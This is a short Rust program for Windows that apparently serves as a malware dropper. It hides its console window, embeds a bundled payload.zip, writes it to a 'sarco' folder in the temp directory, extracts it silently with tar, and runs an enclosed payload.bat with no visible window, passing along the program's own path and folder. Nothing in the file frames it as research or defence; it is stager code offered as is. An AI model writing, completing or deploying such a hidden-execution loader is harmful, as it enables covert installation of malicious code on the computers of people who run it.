#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use std::{os::windows::process::CommandExt, path::PathBuf};

const PAYLOAD_BINARY: &[u8] = include_bytes!("../payload.zip");

fn main() {
    let temp = std::env::var("temp").unwrap();

    let temp = PathBuf::from(temp);
    let new = temp.join("sarco");
    std::fs::create_dir_all(&new).unwrap();
    std::env::set_current_dir(new).unwrap();
    std::fs::write("sarco.zip", PAYLOAD_BINARY).unwrap();

    std::process::Command::new("cmd")
        .args(["/c", "tar", "-xvzf", "sarco.zip"])
        .creation_flags(0x08000000)
        .spawn()
        .unwrap()
        .wait()
        .unwrap();

    let exe_path = std::env::current_exe().unwrap();
    let parent = exe_path.parent().unwrap();

    std::process::Command::new("./payload.bat")
        .args([&exe_path, parent])
        .creation_flags(0x08000000)
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
